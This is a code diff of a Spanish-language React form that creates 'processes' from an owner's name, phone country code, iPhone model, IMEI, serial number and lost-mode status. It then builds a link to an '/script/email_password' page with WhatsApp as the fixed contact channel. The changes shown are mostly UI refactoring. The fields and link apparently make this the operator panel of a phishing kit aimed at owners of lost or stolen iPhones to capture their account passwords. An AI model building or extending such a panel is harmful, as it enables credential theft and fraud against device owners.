@@ -1,12 +1,12 @@
-import React, { useState, useEffect } from 'react';
+
+import React, { useState } from 'react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
-import { Textarea } from '@/components/ui/textarea';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { supabase } from '@/integrations/supabase/client';
 import { useToast } from '@/hooks/use-toast';
-import CustomSelect, { CustomSelectItem } from './CustomSelect';
 import { countryCodes } from '@/utils/countryCodes';
 import ProcessUrlDisplay from './ProcessUrlDisplay';
 
@@ -65,11 +65,6 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
 
   const colors = ['Negro', 'Blanco', 'Rojo', 'Azul', 'Verde', 'Amarillo', 'Morado', 'Rosa', 'Oro', 'Plata'];
   const storageOptions = ['64GB', '128GB', '256GB', '512GB', '1TB'];
-  const contactTypes = [
-    { value: 'whatsapp', label: 'WhatsApp' },
-    { value: 'sms', label: 'SMS' },
-    { value: 'llamada', label: 'Llamada' }
-  ];
 
   const generateIMEI = () => {
     const imei = Array.from({ length: 15 }, () => Math.floor(Math.random() * 10)).join('');
@@ -101,11 +96,9 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
         storage: formData.storage,
         imei: formData.imei,
         serial_number: formData.serialNumber,
-        contact_type: formData.contactType,
+        contact_type: 'whatsapp',
         lost_mode: formData.lostMode
       };
-
-      console.log('Submitting process data:', processData);
 
       const { data, error } = await supabase
         .from('processes')
@@ -113,14 +106,8 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
         .select()
         .single();
 
-      if (error) {
-        console.error('Supabase error:', error);
-        throw error;
-      }
+      if (error) throw error;
 
-      console.log('Process created successfully:', data);
-
-      // Generate URL for the process
       const baseUrl = window.location.origin;
       const processUrl = `${baseUrl}/script/email_password?process=${data.id}`;
       setCreatedUrl(processUrl);
@@ -130,7 +117,6 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
         description: `El proceso para ${formData.clientName} ha sido creado.`,
       });
 
-      // Reset form
       setFormData({
         clientName: '',
         ownerName: '',
@@ -157,7 +143,6 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
     }
   };
 
-  // If URL was created, show the URL display component
   if (createdUrl) {
     return (
       <div className="space-y-6">
@@ -168,7 +153,6 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
         <Button
           onClick={() => {
             setCreatedUrl('');
-            // Reset form data as well
             setFormData({
               clientName: '',
               ownerName: '',
@@ -229,17 +213,18 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
           <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
             <div>
               <Label className="text-blue-300">Código de País</Label>
-              <CustomSelect
-                value={formData.countryCode}
-                onValueChange={(value) => setFormData(prev => ({ ...prev, countryCode: value }))}
-                placeholder="Seleccionar código"
-              >
-                {countryCodes.map((country) => (
-                  <CustomSelectItem key={country.code} value={country.code}>
-                    {country.code} {country.country}
-                  </CustomSelectItem>
-                ))}
-              </CustomSelect>
+              <Select value={formData.countryCode} onValueChange={(value) => setFormData(prev => ({ ...prev, countryCode: value }))}>
+                <SelectTrigger className="bg-black/30 border-blue-500/30 text-white">
+                  <SelectValue placeholder="Seleccionar código" />
+                </SelectTrigger>
+                <SelectContent className="bg-slate-900 border-blue-500/20">
+                  {countryCodes.map((country) => (
+                    <SelectItem key={country.code} value={country.code} className="text-white hover:bg-slate-800">
+                      {country.code} {country.country}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
             </div>
 
             <div className="md:col-span-2">
@@ -260,65 +245,51 @@ const ProcessForm: React.FC<ProcessFormProps> = ({ userType }) => {
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
               <Label className="text-blue-300">Modelo de iPhone *</Label>
-              <CustomSelect
-                value={formData.iphoneModel}
-                onValueChange={(value) => setFormData(prev => ({ ...prev, iphoneModel: value }))}
-                placeholder="Seleccionar modelo"
-              >
-                {iphoneModels.map((model) => (
-                  <CustomSelectItem key={model} value={model}>
-                    {model}
-                  </CustomSelectItem>
-                ))}
-              </CustomSelect>
+              <Select value={formData.iphoneModel} onValueChange={(value) => setFormData(prev => ({ ...prev, iphoneModel: value }))}>
+                <SelectTrigger className="bg-black/30 border-blue-500/30 text-white">
+                  <SelectValue placeholder="Seleccionar modelo" />
+                </SelectTrigger>
+                <SelectContent className="bg-slate-900 border-blue-500/20">
+                  {iphoneModels.map((model) => (
+                    <SelectItem key={model} value={model} className="text-white hover:bg-slate-800">
+                      {model}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
             </div>
 
             <div>
               <Label className="text-blue-300">Color *</Label>
-              <CustomSelect
-                value={formData.color}
-                onValueChange={(value) => setFormData(prev => ({ ...prev, color: value }))}
-                placeholder="Seleccionar color"
-              >
-                {colors.map((color) => (
-                  <CustomSelectItem key={color} value={color}>
-                    {color}
-                  </CustomSelectItem>
-                ))}
-              </CustomSelect>
+              <Select value={formData.color} onValueChange={(value) => setFormData(prev => ({ ...prev, color: value }))}>
+                <SelectTrigger className="bg-black/30 border-blue-500/30 text-white">
+                  <SelectValue placeholder="Seleccionar color" />
+                </SelectTrigger>
+                <SelectContent className="bg-slate-900 border-blue-500/20">
+                  {colors.map((color) => (
+                    <SelectItem key={color} value={color} className="text-white hover:bg-slate-800">
+                      {color}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
             </div>
           </div>
 
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div>
-              <Label className="text-blue-300">Almacenamiento *</Label>
-              <CustomSelect
-                value={formData.storage}
-                onValueChange={(value) => setFormData(prev => ({ ...prev, storage: value }))}
-                placeholder="Seleccionar almacenamiento"
-              >
+          <div className="space-y-2">
+            <Label className="text-blue-300">Almacenamiento *</Label>
+            <Select value={formData.storage} onValueChange={(value) => setFormData(prev => ({ ...prev, storage: value }))}>
+              <SelectTrigger className="bg-black/30 border-blue-500/30 text-white">
+                <SelectValue placeholder="Seleccionar almacenamiento" />
+              </SelectTrigger>
+              <SelectContent className="bg-slate-900 border-blue-500/20">
                 {storageOptions.map((storage) => (
-                  <CustomSelectItem key={storage} value={storage}>
+                  <SelectItem key={storage} value={storage} className="text-white hover:bg-slate-800">
                     {storage}
-                  </CustomSelectItem>
+                  </SelectItem>
                 ))}
-              </CustomSelect>
-            </div>
-
-            <div>
-              <Label className="text-blue-300">Tipo de Contacto</Label>
-              <CustomSelect
-                value={formData.contactType}
-                onValueChange={(value) => setFormData(prev => ({ ...prev, contactType: value }))}
-                placeholder="Seleccionar tipo"
-              >
-                {contactTypes.map((type) => (
-                  <CustomSelectItem key={type.value} value={type.value}>
-                    {type.label}
-                  </CustomSelectItem>
-                ))}
-              </CustomSelect>
-            </div>
+              </SelectContent>
+            </Select>
           </div>
 
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
